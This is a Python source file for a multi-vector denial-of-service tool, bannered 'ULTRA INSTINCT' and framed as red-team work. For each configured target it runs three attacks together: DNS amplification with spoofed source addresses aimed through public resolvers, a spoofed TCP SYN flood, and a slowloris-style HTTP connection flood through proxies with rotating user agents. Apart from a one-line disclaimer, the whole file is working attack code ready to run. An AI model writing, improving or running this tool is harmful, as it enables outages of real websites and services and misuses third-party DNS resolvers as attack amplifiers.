import os
import sys
import time
import random
import asyncio
import logging
import socket
import aiohttp
import configparser
from datetime import datetime
from scapy.all import IP, UDP, TCP, DNS, DNSQR, send
from fake_useragent import UserAgent
import pyfiglet
from colorama import Fore, Style, init

init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Config:
    def __init__(self, config_file='config.ini'):
        self.config = configparser.ConfigParser()
        self.config.read(config_file)
        self.targets = [t.strip() for t in self.config.get('DEFAULT', 'targets', fallback='').split(',') if t.strip()]
        self.duration = int(self.config.get('DEFAULT', 'duration', fallback='600'))
        self.threads = int(self.config.get('DEFAULT', 'threads', fallback='500'))
        self.proxies = [p.strip() for p in self.config.get('DEFAULT', 'proxies', fallback='').split(',') if p.strip()]
        self.dns_servers = [s.strip() for s in self.config.get('DEFAULT', 'dns_servers', fallback='8.8.8.8,1.1.1.1').split(',')]
        self.max_rate = int(self.config.get('DEFAULT', 'max_rate', fallback='500'))
        self.dns_qtype = self.config.get('DEFAULT', 'dns_qtype', fallback='A').upper()
        self.tcp_port = self.config.get('DEFAULT', 'tcp_port', fallback='80')
        self.validate()

    def validate(self):
        if not self.targets:
            raise ValueError("No targets specified")
        if self.duration <= 0 or self.threads <= 0 or self.max_rate <= 0:
            raise ValueError("Duration, threads, and max_rate must be positive")
        if self.dns_qtype not in ['A', 'MX', 'NS', 'TXT', 'CNAME']:
            logging.warning(f"Unsupported DNS qtype '{self.dns_qtype}', defaulting to 'A'")
            self.dns_qtype = 'A'
        try:
            self.tcp_port = int(self.tcp_port)
            if self.tcp_port <= 0 or self.tcp_port > 65535:
                raise ValueError("tcp_port must be between 1 and 65535")
        except ValueError:
            logging.error(f"Invalid tcp_port value '{self.tcp_port}', defaulting to 80")
            self.tcp_port = 80
        for target in self.targets:
            if target.startswith(('http://', 'https://')):
                raise ValueError(f"Invalid target '{target}': URLs are not allowed, use hostname or IP address")
            try:
                socket.gethostbyname(target)
            except socket.gaierror:
                raise ValueError(f"Invalid target '{target}': Unable to resolve hostname or IP address")

class StealthyPacketSender:
    def __init__(self, max_rate):
        self.max_rate = max_rate
        self.sent_packets = 0
        self.start_time = time.time()

    async def send_packet(self, pkt):
        logging.debug(f"Preparing to send packet: {pkt.summary()}")
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            current_rate = self.sent_packets / elapsed
            if current_rate > self.max_rate:
                logging.debug(f"Rate {current_rate:.2f} exceeds max {self.max_rate}, sleeping")
                await asyncio.sleep(0.001)
        await asyncio.get_event_loop().run_in_executor(None, lambda: send(pkt, verbose=False))
        self.sent_packets += 1
        logging.debug(f"Sent packet {self.sent_packets}")

async def advanced_dns_amplification(target, dns_servers, duration, max_rate, qtype='A'):
    sender = StealthyPacketSender(max_rate)

    def random_ip():
        return '.'.join(str(random.randint(1, 254)) for _ in range(4))

    query = DNSQR(qname=target, qtype=qtype)
    end_time = time.time() + duration
    packet_count = 0
    last_log_time = time.time()

    while time.time() < end_time:
        for dns_server in dns_servers:
            pkt = IP(src=random_ip(), dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=query)
            await sender.send_packet(pkt)
            packet_count += 1

        now = time.time()
        if now - last_log_time > 5:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] DNS Amplification: Sent {packet_count} packets to {target} via {dns_servers}", flush=True)
            last_log_time = now

        await asyncio.sleep(0.001)

async def tcp_syn_flood(target, duration, max_rate, port=80):
    sender = StealthyPacketSender(max_rate)

    def random_ip():
        return '.'.join(str(random.randint(1, 254)) for _ in range(4))

    end_time = time.time() + duration
    packet_count = 0
    last_log_time = time.time()

    while time.time() < end_time:
        pkt = IP(src=random_ip(), dst=target) / TCP(dport=port, flags='S', seq=random.randint(1000, 9000))
        await sender.send_packet(pkt)
        packet_count += 1

        now = time.time()
        if now - last_log_time > 5:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] TCP SYN Flood: Sent {packet_count} packets to {target}:{port}", flush=True)
            last_log_time = now

        await asyncio.sleep(0.001)

async def multi_vector_attack(cfg):
    ua = UserAgent()
    end_time = time.time() + cfg.duration

    async def slowloris_attack(target, proxies=None, end_time=end_time):
        async with aiohttp.ClientSession() as session:
            connections = []
            request_count = 0
            last_log_time = time.time()
            valid_proxies = []
            
            # Validate proxies before starting
            if proxies:
                for proxy in proxies:
                    try:
                        proxy_host = proxy.split('://')[1].split(':')[0] if '://' in proxy else proxy.split(':')[0]
                        socket.gethostbyname(proxy_host)
                        valid_proxies.append(proxy)
                    except socket.gaierror:
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Warning: Proxy {proxy} is invalid (cannot resolve hostname), skipping", flush=True)
                if not valid_proxies:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Warning: No valid proxies available, using direct connection", flush=True)
            
            # Ensure target has a scheme; try https first, fall back to http
            if not target.startswith(('http://', 'https://')):
                target_url = f'https://{target}'
                try:
                    async with session.head(target_url, timeout=5) as resp:
                        if resp.status >= 400:
                            print(f"[{datetime.now().strftime('%H:%M:%S')}] Warning: Target {target_url} returned status {resp.status}, trying http", flush=True)
                            target_url = f'http://{target}'
                except aiohttp.ClientError as e:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Warning: HTTPS failed for {target_url} ({str(e)}), trying http", flush=True)
                    target_url = f'http://{target}'
            else:
                target_url = target

            while time.time() < end_time:
                try:
                    headers = {
                        'User-Agent': ua.random,
                        'Connection': 'keep-alive',
                        'Accept': '*/*',
                        'Cache-Control': 'no-cache'
                    }
                    proxy = random.choice(valid_proxies) if valid_proxies else None
                    async with session.get(target_url, headers=headers, timeout=10, proxy=proxy) as conn:
                        connections.append(conn)
                        request_count += 1
                        now = time.time()
                        if now - last_log_time > 5:
                            print(f"[{datetime.now().strftime('%H:%M:%S')}] Slowloris: Sent {request_count} requests to {target_url} (proxy: {proxy or 'none'})", flush=True)
                            last_log_time = now
                        await asyncio.sleep(random.uniform(0.1, 0.3))
                except aiohttp.ClientError as e:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Slowloris error for {target_url}: {str(e)}", flush=True)
                except Exception as e:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Unexpected error in slowloris_attack for {target_url}: {str(e)}", flush=True)
                if len(connections) > cfg.threads:
                    to_close = connections.pop(0)
                    await to_close.close()

    tasks = []
    for target in cfg.targets:
        tasks.append(advanced_dns_amplification(target, cfg.dns_servers, cfg.duration, cfg.max_rate, cfg.dns_qtype))
        tasks.append(slowloris_attack(target, cfg.proxies, end_time))
        tasks.append(tcp_syn_flood(target, cfg.duration, cfg.max_rate, cfg.tcp_port))

    await asyncio.gather(*tasks)

def banner():
    print(Fore.LIGHTYELLOW_EX + pyfiglet.figlet_format("ULTRA INSTINCT", font="slant"))
    print(Fore.CYAN + f"[!] Author     : St34lthv3ct3r")
    print(Fore.CYAN + f"[!] Timestamp  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(Fore.CYAN + f"[!] Operation  : Red Team")
    print(Fore.GREEN + "[!] Use it at your own risk. Unauthorized access is illegal." + Style.RESET_ALL)

async def main():
    cfg = Config()
    banner()
    await multi_vector_attack(cfg)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Denial of service interrupted by the pentester")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        sys.exit(1)